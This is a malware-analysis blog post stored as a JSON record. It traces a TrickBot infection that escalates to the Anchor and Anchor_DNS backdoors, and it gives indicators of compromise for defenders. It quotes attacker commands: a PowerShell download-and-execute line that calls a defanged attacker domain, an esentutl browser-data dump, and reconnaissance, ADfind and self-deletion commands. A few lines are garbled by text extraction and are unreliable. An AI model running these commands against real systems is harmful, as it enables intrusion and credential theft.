{
    "id": "74710937-75e1-45f0-8cd6-ae56fe7a8df8",
    "created_at": "2023-01-12T15:07:13.291058Z",
    "updated_at": "2025-03-27T02:15:13.867938Z",
    "deleted_at": null,
    "sha1_hash": "fc3e9e34d4333180afa08cd25d6e89ac52d5613f",
    "title": "2019-12-11 - Dropping Anchor- From a TrickBot Infection to the Discovery of the Anchor Malware",
    "authors": "",
    "file_creation_date": "2022-05-27T23:10:21Z",
    "file_modification_date": "2022-05-27T23:10:21Z",
    "file_size": 10298628,
    "plain_text": "# Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\n**[cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware](https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware)**\n\n\n-----\n\nWritten By\nCybereason Nocturnus\n\nDecember 11, 2019 | 15 minute read\n\n## Introduction\n\n**Research By: Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt Hart**\n\nCybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in\nearly October. Similar to attacks [previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a](https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware)\nhacking operation targeting sensitive financial systems.\n\n[However, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and](https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware) [LockerGoga) by compromising](https://www.fortinet.com/blog/threat-research/lockergoga-ransomeware-targeting-critical-infrastructure.html)\ncritical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a\nnewly discovered malware family called Anchor exclusively for high-profile targets.\n\n[Learn more about additional attacks that leverage TrickBot.](https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware)\n\nThis research focuses on the following aspects of the TrickBot-Anchor attack:\n\n1. Anatomy of the Attack: **A** **step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques**\n\nused by the attackers.\n2. New Malware: **[The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented](https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns)**\n\n_Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very_\nselectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who\ncreated TrickBot.\n\nWhile this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques\n[detailed, have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that](https://attack.mitre.org/groups/G0037/) is known to\n[target POS systems and has been linked to TrickBot infections in the past.](https://www.zdnet.com/article/cybercrime-group-fin6-evolves-from-pos-malware-to-ransomware/)\n\n\n-----\n\nast y, ou b og e p as es t e g a ty a d da ge t at es co od ty a a e ect o s, as t ey a e t e pote t a o esca at g to a\nhacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.\n\n## Key Points\n\n**The TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing,**\nand retail businesses across the United States and Europe.\n**Targets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’**\nnetwork.\n**Deploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare**\n[Anchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.](https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns)\n**Uses a New, Undocumented Malware: In addition to the new Anchor_DNS variant, the attackers use a completely new and previously**\nundocumented malware dubbed Anchor. _Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot._\n**Adds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing**\n[passwords from various products, including the KeePass password manager.](https://keepass.info/)\n**Uses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the**\n[known tools Meterpreter,](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter) [PowerShell Empire, and](https://github.com/EmpireProject/Empire) [Cobalt Strike for reconnaissance and lateral movement.](https://www.cobaltstrike.com/)\n**Abuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-**\ngrowing trend of signed threats that abuse the trust of certificate authorities to bypass detection.\n\n## Table of Contents\n\n Anatomy of the Attack: A Step-by-Step Analysis\n\n_An overview of the attack tree, as seen in the Cybereason Defense Platform._\n\n## Infection Vector\n\n_Downloading and injecting TrickBot._\n\nThe attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When\nthe user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen,\n[where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.](https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware)\n\n\n-----\n\n_Phishing email that tricks the user into downloading TrickBot._\n\n### The TrickBot Downloader\n\nThe campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user doubleclicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update\nMicrosoft Word or open the file from another computer.\n\n_TrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document._\n\nWhile at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are\nnot associated with Microsoft Word, nor are they Microsoft Word document files.\n\nMost of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is\ngiven to signed binaries to avoid detection.\n\n_File metadata properties for the fake Microsoft Word Document._\n\n\n-----\n\n_Signed malware is an evasive initial entry point into an organization._\n\nThe message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects\nthe TrickBot payload into a svchost.exe process.\n\n_svchost.exe injected code malicious evidence as seen in the Cybereason Platform._\n\nDomain associated with the TrickBot payload download.\n\n## The TrickBot Payload\n\nOnce TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the\ninfected endpoint and the network. This information is crucial, as it determines the course of the attack.\n\n**Checking Network Connectivity**\n\nTrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to\nlegitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com,\nwtfismyip.com, ip.anysrc.net.\n\n\n-----\n\nOnce TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects\nand sends information about where the target machine is located to the C2 servers.\n\n**Browser History and Credential Theft**\n\nAfter TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The\n[module core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for](https://www.fortinet.com/blog/threat-research/deep-analysis-of-trickbot-new-module-pwgrab.html)\nsecondary C2 communication, redirection, and web injection logic.\n\n_core-parser.dll injected into svchost.dll._\n\nTrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling\nthe stolen data.\n\n\n-----\n\n_A list of C2 servers extracted from TrickBot’s configuration._\n\n[TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v%3Dws.11))\n(LOLBin).\n```\nesentutl /p /o C:\\Users\\[USER]\\AppData\\Local\\Temp\\grabber_temp.edb\n\n```\n[This command dumps the Extensible Storage Engine (ESE) database format.](https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/)\n\n**Application-specific Credential Theft**\n\n[This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's](https://keepass.info/)\n[KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script](https://github.com/wevans311082/PoshKPBrute)\nthat performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends\nthe attackers the master password.\n\n\n-----\n\n_KeePass stealing brute force tool._\n\n[TrickBot’s stealer module also tries to extract keys from Filezilla,](https://filezilla-project.org/) [OpenSSH and](https://www.openssh.com/) [OpenVPN.](https://openvpn.net/)\n\n_TrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN._\n\n**Reconnaissance Commands**\n\nIn addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including\n**nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:**\n\nAll trusted domains, domains, and domain controllers\nA list of computers and network devices on the network\nThe infected machine user and groups the user belongs to\nThe infected machine, including machine name, operating system, workstation domain, and more information\nNetwork adapters that have connected to the machine and DNS servers\n\n\n-----\n\n_The net.exe process tree._\n```\nNltest / domain_trusts /all_trusts\nNet view /all\nNltest /domain_trusts\nNet view /all /domain\nIpconfig /all\nNet config workstation\nNslookup “-q=srv_kerberos._tcp”\n/c “start microsoft-edge:http://127.0.0.1:52715/11984”\n\n```\n_Reconnaissance commands launched by TrickBot._\n\nThe attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to\nopen an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the\ndomain controllers.\n\n_TrickBot testing DNS settings._\n\nWith this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.\n\n## From TrickBot Infection to Interactive Hacking\n\nThe threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so,\nthey escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the\nmass deployment of ransomware across endpoints connected to the domain controller.\n\n### PowerShell Payloads\n\nThe threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a\nsecondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.\n\n\n-----\n\n_po e s e e e_ _op_ _do Sty e_ _dde_ _e ecut o po cy bypass c_ _(( e_ _object_\n_net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))\"_\n\nThe northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this\nspecific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for\n[similar](https://any.run/report/daf223b923f335c3de66cae8a091063361262669c8f9acaf59a352b1e0e07b8c/b92f9889-00f9-429d-97e4-fb149cfe66db) [activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to](https://app.any.run/tasks/b92f9889-00f9-429d-97e4-fb149cfe66db/)\nsee if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and\ncontinuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from\nthe user’s hostname and the current process ID.\n\n_Information sent along each POST request in the payload._\n\nA POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file\nsystem, and information about the operating system.\n\n\n-----\n\n_The PowerShell payloads using WMI to probe for system information._\n\nThis information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response\nmatches the value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a\ntimeout variable based on the response and continues to the main loop.\n\nThis indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.\n\nThe main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.\n\n_The main loop that sends a POST request to the server._\n\n\n-----\n\nac e t e espo se o t e t eat acto co ta s a ase6 e coded co a d, c s decoded a d t e ed ate y e ecuted us g\nPowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request\nwith the “a” parameter.\n\n### Meterpreter & Cobalt Strike Implants\n\n_The attack tree demonstrating the beginning of the hacking operation using Meterpreter._\n\n**Meterpreter Implant**\n\nThe attackers use a [Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter)\nvarious Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:\n\n**Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented**\n**Ext_server_priv.x86.dll: For privilege escalation**\n**Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance**\n\nCybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.\n\n_Examining the loaded modules shows which Metasploit modules are loaded._\n\nThe Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.\n\n**Cobalt Strike Implant**\n\nUsing Meterpreter, the attackers injected [Cobalt Strike and other Metasploit payloads into the rundll32.exe process.](https://www.cobaltstrike.com/)\n\n\n-----\n\n_Attackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process._\n\n_Detection of Cobalt Strike, Meterpreter, and shellcode execution._\n\n[The attacker uses the following metasploit modules:](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)\n\n**ext_server_extapi.x86.dll: Obtains clipboard data and manipulates and decrypts the NTDS file**\n**ext_server_priv.x86.dll: Performs privilege escalation**\n**Ext_server_stdapi.x86.dll: Performs reconnaissance activity**\n**Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control**\n\n_Post-exploitation modules reflectively loaded to rundll32.exe_\n\n\n-----\n\n_The connection to the external IP address 199.217.115[.]53 on port 8443._\n\nBoth Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including\n[the FIN6 threat actor.](https://attack.mitre.org/groups/G0037/)\n\n**Active Directory Discovery using Cobalt Strike**\n\nThe threat actor uses known Cobalt Strike modules to enumerate Active Directory information:\n\n[https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1](https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1)\n[https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna](https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna)\n\nThe attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine’s user is in the admin or\ndomain admin group.\n\nAfter verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an\nadditional Base64-encoded and compressed PowerShell command.\n\n_The obfuscated and compressed PowerShell command._\n\nThe decoded PowerShell command that attempts to gather domain controller information.\n\n**Active Directory Discovery using ADfind**\n\n[The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.](http://www.joeware.net/freetools/tools/adfind/)\n```\nadfind.exe -f \"(objectcategory=organizationalUnit)\"\nadfind.exe -gcb -sc trustdmp\nadfind.exe -f \"objectcategory=computer\"\nadfind.exe -sc trustdmp\nadfind.exe -f \"(objectcategory=person)\"\nadfind.exe -subnets -f (objectCategory=subnet)\nadfind.exe -f \"(objectcategory=group)\"\n\n```\n[The ADfind tool has reportedly been used previously in attacks related to FIN6.](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)\n\n## New Anchor_DNS Variant Discovered\n\nOne of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT\nSecurity. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2\nservers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n\n\n-----\n\n_Oldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4_\n\nThis new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. Anchor_DNS is still undergoing rapid\ndevelopment cycles with code changes and new feature updates every few weeks.\n\nThis is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:\n\nNo self-deletion mechanism shown in previous samples\nNo internet connectivity checks using legitimate online web services\nA built-in capability to check for C2 availability using ICMP (ping)\nAdditional partial string encryption and code obfuscation\n\n### Static Analysis Observations\n\n**File name** **SHA-1**\n\nanchorDNS_x64.exe 5f1ad1787106de9725005d8da33d815d0994ee83\n\nanchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS. This file is the 64-bit version of Anchor_DNS, however,\nthere were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of Anchor_DNS.\n\n_`PDB PATH: C:\\simsim\\anchorDNS.v5\\Bin\\x64\\Release\\anchorDNS_x64.pdb_\n\nMany strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native\nenglish speakers.\n\n_Multiple typos and grammatical mistakes in the Anchor_DNS code._\n\nThe threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by\nimplementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of\nAnchor_DNS and the new variant.\n\n\n-----\n\nAnchor_DNS was able to stay under-the-radar by using specific execution flags. If these command-line arguments are not supplied, the\nAnchor_DNS terminates.\n\n**-i flag:**\n\ncreates a scheduled task with the following naming convention (e.g “Notepad++ autoupdate#94654”): [random folder name in\n**%APPDATA%]** **autoupdate#[random_number]**\n\nWrites [NTFS ADS files ($TASK, $GUID, $FILE)](https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/)\n\n\n**Alternate Data**\n**Stream**\n\n\n**ADS Contents** **Decoded Contents**\n\n\nedskype.exe:$FILE QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW1pbmdcU2t5cGVcZWRza3lwZS5leGU= C:\\Users\\user\\AppData\\Roaming\\S\n\n\n-----\n\nedskype.exe:$TASK\nTm90ZXBhZCsrIGF1dG91cGRhdGUjOTQ2NTQ\n\n\nNotepad++ autoupdate#94654\n\n\nedskype.exe:$GUID [BASE64] /anchor_dns/[COMPUTER_NAME]\n\n[clientID]/\n\n**-u flag:**\n\n**New Variant: executes the malware’s main communication module with the C2**\n**Old Variant:**\n\nDrops a copy in %TEMP%\nCreates ADS files ($GUID, $FILE)\n**-s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.**\n**--log=: expects a file name to write log file in C:\\Users\\[USER]**\n\n_Contents of the debug file created by Anchor_DNS._\n\n**C2 Communication**\n\nOlder and newer versions of Anchor_DNS communicate over DNS. However, the newer version described here does not check Internet\nconnectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server’s availability using\nthe ICMP protocol.\n\n_Determining C2 server connectivity._\n\nDNS Tunneling\n\n[Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling. With this technique, Anchor_DNS can transfer data, receive](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152)\n[commands, and download an additional payload, as detailed in NTT Security’s report on an older Anchor_DNS sample.](https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns)\n\nBy implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS\ntraffic.\n\n\n-----\n\n_Example of DNS Tunneling traffic generated by Anchor_DNS._\n\n## Discovery of The Anchor Malware and Its Connection to TrickBot\n\nDuring our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed Anchor by its\nauthors and has been active since August 2018. Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.\nHowever, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.\n\n_Earliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)_\n\n_PDB path for the earliest Anchor sample found._\n\nMany Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this\nmalware.\n\n\n-----\n\n_List of Anchor payloads found on VirusTotal with 0/0 detection rate._\n\nThe malware has both x86 and x64 versions and contains an installer component to install the malware.\n\n**Payload Name** **Hash** **PDB Path**\n\n\nanchorInstaller_x86 3ed09498214d93c9ec14a15286546d242ad58943\n\n4bba60ff11f8b150b004960c658ad74a707ebcea\n\nanchorInstaller_x64 e75983b073ff0632e35e237f6622466c2699687c\n\nAnchor_x86 Bd26238fb7d7e16ea79073d882bba00d34dd859c\n\nF3683a0c12154e8bf44d9d942db3eac9e930e7a5\n\n9ebb541dcb24d564448a6f5e00c613b73eba7148\n\nAnchor_x64 46c595e580719a4c54f55b4041f81d6e50ab4062\n\ne5dc7c8bfa285b61dda1618f0ade9c256be75d1a\n\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\anchorInstaller_x86\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\anchorIn\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\Anchor_\n\nD:\\Anchor\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nD:\\Anchor\\x64\\Debug\\Anchor_x64.pdb\n\nC:\\[JOB]\\Anchor\\x64\\Release\\Anchor_x64.pdb\n\n\nThe Anchor payload is delivered by AnchorInstaller _AnchorInstaller unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or_\n%SYSTEMROOT%\\System32 folder. The dropped DLL is loaded by the service netTcpSvc, which is created by the malware.\n\n_Anchor service persistence found in the registry._\n\n### NTFS ADS File - Storing the GUID\n\nSimilar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:\n\n\n-----\n\n_Anchor GUID stored as an NTFS ADS._\n\nUnlike Anchor_DNS, which stores the information in Base64, Anchor’s GUID is saved in cleartext.\n\n### Self Deletion\n\n_Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the_\ndropper is deleted once the malware was successfully deployed:\n\ncmd.exe /c timeout 1 && del C:\\Users\\[USER]\\[SAMPLE_LOCATION]\"\ncmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\\Users\\[USER]\\[SAMPLE_LOCATION]'\n\n### C2 Communication\n\nSimilar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2\nservers. It uses the following hardcoded web services to test connectivity:\n\nOnce it has established connectivity, it communicates with a set of hardcoded C2 servers.\n\n_Communication with a set of hardcoded C2 servers._\n\n[The request and response follow the same C2 communication format as TrickBot.](http://malware-traffic-analysis.net/2019/10/02/index.html)\n\n\n-----\n\n_e equest a d espo se o_ _at o_ _c o_\n\n### Connecting Anchor / Anchor_DNS to TrickBot\n\n_Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are_\nalso several other similarities noted below.\n\n**GUID Generation Function**\n\nThe GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot. The GUID\nfollows this pattern:\n\n**[Machine_NAME]_[Windows_Version].[Client_ID]**\n\n**Malware Name** **GUID**\n\nAnchor_DNS /anchor_dns/MACHINE-001_W617601.D4CB942AA18EFF519DCBCAE88A0A99FB/\n\nAnchor /anchor001/jujubox-PC_W617601.6E8516CA48318FB2904E2027B5350B26\n\nTrickbot /mor49/DAVID-PC_W10017134.55C60B5D13499341D72F5A34C632CFD9\n\n**External IP Check Web Services**\n\nBoth Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the\nexternal IP of the infected machine. The same list is also used by TrickBot:\n\ncheckip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.\n\nIn certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.\n\n**Shared C2 Infrastructure**\n\nTrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server\noverlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served\n_Anchor_DNS and TrickBot:_\n\n_Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)_\n\n**Connection to TrickBot**\n\nThis above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker,\nand Mimikatz.\n\n**Connection to Anchor_DNS**\n\n[The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.](https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns)\n\n\n-----\n\n_ass e_ _S_ _o_ _at o_ _o_ _3 95 9 [ ]59, ta e_ _o_ [us ota](https://www.virustotal.com/gui/ip-address/23.95.97.59/relations)\n\n### Comparison Between Anchor Malware Family\n\nThe following table gives a comparison between different malware in the Anchor malware family.\n\n**Features** **Anchor** **Old Anchor_DNS** **New Anchor_DNS**\n\nEarliest Observed Sample August 2018 May 2019 November 2019\n\nCommand-line arguments? - + +\n\nSelf-Deletion + + \nNetwork Connectivity check via ICMP - - +\n\nNetwork Connectivity check via web services + + \nNTFS ADS files + + +\n\n\nTrickBot’s GUID Generation pattern +\n\n(Cleartext)\n\n\n+\n\n(base64)\n\n\n+\n\n(base64)\n\n\nCode Obfuscation Very Little Very Little Obfuscated Code\n\nC2 Communication Protocols HTTP(S) DNS ICMP, DNS\n\n## Rise of Signed Malware\n\nCode signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not\nbeen tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the\ncase. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions\nthat grant trust to signed binaries.\n\nMalicious files in this attack were signed by:\n\nBiller FIN Oy\nNIRMAL 0013 Limited\nBRO-BURGER, LLC\n\nTrickBot payloads and Anchor / Anchor_DNS payloads were at times signed by the same signer, which further demonstrate that these\nmalware are most likely used by the same threat actor.\n\nIn searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same\norganizations. Some were also signed with the same serial number.\n\n1. Biller FIN Oy Signer:\n\n\n-----\n\n[A VirusTotal Signer name search shows malware associated with these campaigns:](https://www.virustotal.com/gui/search/signature%253A%2522Biller%2520FIN%2520Oy%2522/files)\n\n[A VirusTotal Serial Number search shows malware associated with the campaigns:](https://www.virustotal.com/gui/search/signature%253A%252206%252027%2520E6%25203C%2520FA%252011%252017%252045%252084%252028%2520D3%252092%2520DF%2520AA%25208D%2520AE%2522/files)\n\n\n-----\n\n## Conclusion\n\nThis research gives a detailed step-by-step analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the\nUnited States and Europe. These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation\nleveraging a new malware, Anchor, and a new variant of Anchor_DNS.\n\n[Unlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive](https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware)\ninformation from POS systems and other sensitive resources in the victims’ network by compromising critical assets.\n\nIn addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered\n_Anchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes_\nalso share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over\nDNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many\nsecurity products including certain sandboxes and AV vendors.\n\nThese attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high\nvolume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If\nthey identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as\nan entry point to other machines on the network.\n\nThis research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our\nresearch, we noticed certain TTP overlaps with earlier attacks that were attributed to the financially-motivated FIN6 threat actor. We leave it to\nour readers to draw their own conclusions on the attribution of these attacks.\n\nLastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve,\nsecurity practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in\ngeneral.\n\n[The best way to defend against an attack like this is to use an iterative security process. Read more in our white paper.](https://www.cybereason.com/unleashing-the-true-potential-mitre-attck?hsCtaTracking=d8b5fccc-df9b-4621-86be-9d72ad635e7f%7C31de2ef9-bf97-4290-a751-4c3ec822e56c)\n\n## Indicators of Compromise\n\n[For a comprehensive list of indicators of compromise, please see the PDF file for this attack here.](https://www.cybereason.com/hubfs/Indicators%20of%20Compromise/Anchor%20IOCs.pdf)\n\n## MITRE ATT&CK Techniques\n\n\n**Initial Access** **Execution** **Persistence** **Privilege**\n**Escalation**\n\n\n**Defense Evasion** **Credential**\n**Access**\n\n\n**Discovery** **Collection** **Exfiltration** **C&**\n\n\n-----\n\nSpearphishing\nLink\n\nAbout the Author\n\n\n[User Execution](https://attack.mitre.org/techniques/T1204) Scheduled\nTask\n\n\n[Modify Registry](https://attack.mitre.org/techniques/T1112) Credentials\n[from Web](https://attack.mitre.org/techniques/T1503)\nBrowsers\n\n[Code Signing](https://attack.mitre.org/techniques/T1116) Brute\nForce\n\n[Process Injection](https://attack.mitre.org/techniques/T1055) 